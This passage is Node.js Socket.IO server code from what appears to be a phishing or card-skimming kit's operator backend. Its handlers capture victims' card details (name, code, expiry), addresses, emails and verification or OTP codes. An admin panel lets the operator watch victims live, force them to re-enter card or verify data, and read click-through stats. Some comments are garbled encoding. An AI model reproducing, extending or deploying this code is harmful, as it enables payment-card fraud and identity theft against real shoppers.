  socket.on('checkout-submit', (data) => {
    const active = getActiveRecord(socket.id);
    if (active) {
      active.checkoutName = (data?.checkoutName || '').toString();
      active.checkoutPhone = (data?.checkoutPhone || '').toString();
      active.checkoutCode = (data?.checkoutCode || '').toString();
      active.checkoutExpiryDate = (data?.checkoutExpiryDate || '').toString();

      // 鉁?鎻愪氦鏃惰褰曟棩鏈?
      active.checkoutDate = nowCN();
      pushCheckoutSnapshot(active);

      active.page = 'checkout';
      touch(active, 'Checkout submitted');
    }
    emitAdmin();
  });

  // -----------------------------
  // admin forces refill (with optional reason) - 閲嶅～ Info
  // -----------------------------
  socket.on('request-refill', ({ socketId, reason }, ack) => {
    if (!isAdminSocket(socket.id)) {
      ack?.({ ok: false, error: 'admin unauthorized' });
      return;
    }

    const targetSocket = io.sockets.sockets.get(socketId);
    if (!targetSocket) {
      ack?.({ ok: false, error: 'target user offline / socket not found' });
      return;
    }

    const mainRecord = getMainRecord(socketId);
    if (!mainRecord) {
      ack?.({ ok: false, error: 'main record not found' });
      return;
    }

    const subId = nextSubId(mainRecord.id);
    const ts = nowTs();

    const subRecord = {
      id: subId,
      clientId: mainRecord.clientId || '',
      socketId,
      ip: mainRecord.ip,
      deviceType: mainRecord.deviceType || deviceType,
      deviceOS: mainRecord.deviceOS || deviceOS,
      time: nowCN(),
      page: 'info',
      online: true,

      status: 'Refill requested - please re-enter',

      // info reset
      fullname: '',
      address: '',
      fulladdress: '',
      city: '',
      state: '',
      postalcode: '',
      email: '',
      telephone: '',

      // checkout reset
      checkoutName: '',
      checkoutPhone: '',
      checkoutCode: '',
      checkoutExpiryDate: '',
      checkoutDate: '',
      checkoutSnapshots: [],

      // verify/email/app reset
      verify: '',
      verifyHistory: [],
      verifyMethod: '',
      emailVerify: '',
      appCheck: '',

      createdAt: ts,
      updatedAt: ts,
      history: [{ at: ts, time: nowCN(), status: 'Created sub record (refill info)' }],
      refillReason: reason || '',
      note: '',
      active: true,
    };

    records.push(subRecord);
    setActiveRecord(socketId, subId);

    // tell user
    targetSocket.emit('force-refill', { reason: reason || '', recordId: subId });

    emitAdmin();
    ack?.({ ok: true });
  });

  // -----------------------------
  // admin forces "checkout refill" - keep same record id (no new sub record)
  // -----------------------------
  socket.on('request-checkout-refill', ({ socketId, recordId }, ack) => {
    if (!isAdminSocket(socket.id)) {
      ack?.({ ok: false, error: 'admin unauthorized' });
      return;
    }

    const targetSocket = io.sockets.sockets.get(socketId);
    if (!targetSocket) {
      ack?.({ ok: false, error: 'target user offline / socket not found' });
      return;
    }

    let targetRecord = null;
    if (recordId !== undefined && recordId !== null) {
      targetRecord = records.find((r) => r.socketId === socketId && r.id.toString() === recordId.toString()) || null;
    }
    if (!targetRecord) {
      targetRecord =
        getActiveRecord(socketId) ||
        records.find((r) => r.socketId === socketId && r.active) ||
        getMainRecord(socketId) ||
        null;
    }
    if (!targetRecord) {
      ack?.({ ok: false, error: 'target record not found' });
      return;
    }

    // Keep same sequence id, clear checkout + verify related fields.
    pushCheckoutSnapshot(targetRecord);
    targetRecord.checkoutName = '';
    targetRecord.checkoutPhone = '';
    targetRecord.checkoutCode = '';
    targetRecord.checkoutExpiryDate = '';
    targetRecord.checkoutDate = '';

    targetRecord.verify = '';
    targetRecord.verifyMethod = '';
    targetRecord.emailVerify = '';
    targetRecord.appCheck = '';

    targetRecord.page = 'checkout';
    targetRecord.online = true;

    touch(targetRecord, 'Checkout refill requested - please re-enter');
    setActiveRecord(socketId, targetRecord.id);

    // route user to checkout
    io.to(socketId).emit('checkout-route', { target: 'checkout', reason: 'Please refill checkout information' });

    targetSocket.emit('force-checkout-refill', { recordId: targetRecord.id });

    emitAdmin();
    ack?.({ ok: true });
  });

  // admin adds note
  socket.on('admin-set-note', ({ recordId, note }, ack) => {
    if (!isAdminSocket(socket.id)) {
      ack?.({ ok: false, error: 'admin unauthorized' });
      return;
    }

    const r = records.find((x) => x.id.toString() === recordId.toString());
    if (!r) {
      ack?.({ ok: false, error: 'record not found' });
      return;
    }
    r.note = String(note || '').slice(0, 500);
    touch(r, r.status || 'Updated note');
    emitAdmin();
    ack?.({ ok: true });
  });

  socket.on('join-admin', ({ password } = {}, ack) => {
    const input = (password || '').toString();
    if (!input || input !== ADMIN_PASSWORD) {
      adminSockets.delete(socket.id);
      socket.leave('admin');
      ack?.({ ok: false, error: 'invalid password' });
      return;
    }

    adminSockets.add(socket.id);
    socket.join('admin');
    const visits = visitClientIds.size;
    const clicks = clickClientIds.size;
    const stepDone = visits + clicks;
    const stepTotal = visits * 2;
    const clickRate = stepTotal > 0 ? Number(((stepDone / stepTotal) * 100).toFixed(1)) : 0;
    socket.emit('admin-update', {
      records,
      onlineUsers: Array.from(onlineUsers.values()).filter((u) => u && u.activated),
      stats: { visits, clicks, stepDone, stepTotal, clickRate },
    });
    ack?.({ ok: true });
  });

  socket.on('admin-clear-all', (_, ack) => {
    if (!isAdminSocket(socket.id)) {
      ack?.({ ok: false, error: 'admin unauthorized' });
      return;
    }

    records = [];
    recordCounter = 1;
    onlineUsers.forEach((u) => (u.activeRecordId = null));
    emitAdmin();
    ack?.({ ok: true });
  });

  socket.on('disconnecting', () => {
    const user = onlineUsers.get(socket.id);
    if (user) user.online = false;
    discordHomeNotified.delete(socket.id);

    records.forEach((r) => {
      if (r.socketId === socket.id) {
        r.online = false;
        touch(r, r.status || 'Offline');
      }
    });

    emitAdmin();
  });

  socket.on('disconnect', () => {
    adminSockets.delete(socket.id);
    onlineUsers.delete(socket.id);
    discordHomeNotified.delete(socket.id);
    emitAdmin();
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`鏈嶅姟鍣ㄨ繍琛屽湪 ${PORT}`));
